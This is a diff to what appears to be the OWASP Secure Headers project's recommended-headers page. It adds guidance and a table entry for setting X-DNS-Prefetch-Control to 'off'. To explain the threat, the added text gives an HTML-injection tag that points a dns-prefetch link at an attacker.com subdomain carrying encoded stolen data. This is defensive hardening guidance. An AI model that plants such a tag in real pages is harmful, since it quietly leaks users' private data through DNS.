@@ -33,6 +33,11 @@ The following section proposes a configuration for the [actively supported and w
 
 🚩 The header `Clear-Site-Data` will cause the browser to take additional processing time for the HTTP response, so, set it to the logout function when possible.
 
+🚩 The header `X-DNS-Prefetch-Control` seems currently only supported by [Chromium based browsers](https://github.com/OWASP/www-project-secure-headers/issues/201#issuecomment-3190756900) and more precisely Chrome for the `off` instruction. Therefore, as Chrome is highly used ([source](https://gs.statcounter.com/browser-market-share)), the proposal is to add the header on HTTP response which either:
+
+* Return sensitive or private content (commonly called [PII](https://en.wikipedia.org/wiki/Personal_data)).
+* Prone to HTML injection where an attacker can inject a tag `<link rel="dns-prefetch" href="//[exfiltrated data encoded].attacker.com">` to exfiltrate data quietly via DNS or be notified via DNS when the victim rendered the response in a browser.
+
 🔬 For the header `Permissions-Policy`, as it is currently only supported by [Chromium based browsers](https://caniuse.com/permissions-policy), the proposed value was generated with this [site](https://www.permissionspolicy.com/) and tested against the version `137.0.7124.0` of [Chromium](https://chromium.woolyss.com/download/en/) to only specify supported features.
 
 💡 Content of the table below is also provided, as JSON, via this [file](ci/headers_add.json) (automatically updated).
@@ -52,7 +57,8 @@ The following section proposes a configuration for the [actively supported and w
 | Cross-Origin-Opener-Policy                   | `same-origin`   |
 | Cross-Origin-Resource-Policy                 | `same-origin`  |
 | Permissions-Policy                           | `accelerometer=(), autoplay=(), camera=(), cross-origin-isolated=(), display-capture=(), encrypted-media=(), fullscreen=(), geolocation=(), gyroscope=(), keyboard-map=(), magnetometer=(), microphone=(), midi=(), payment=(), picture-in-picture=(), publickey-credentials-get=(), screen-wake-lock=(), sync-xhr=(self), usb=(), web-share=(), xr-spatial-tracking=(), clipboard-read=(), clipboard-write=(), gamepad=(), hid=(), idle-detection=(), interest-cohort=(), serial=(), unload=()` |
-| Cache-Control         | `no-store, max-age=0`  |
+| Cache-Control                                | `no-store, max-age=0`  |
+| X-DNS-Prefetch-Control                       | `off`  |
 
 <!-- HEADERS_ADD_TABLE_END -->
 
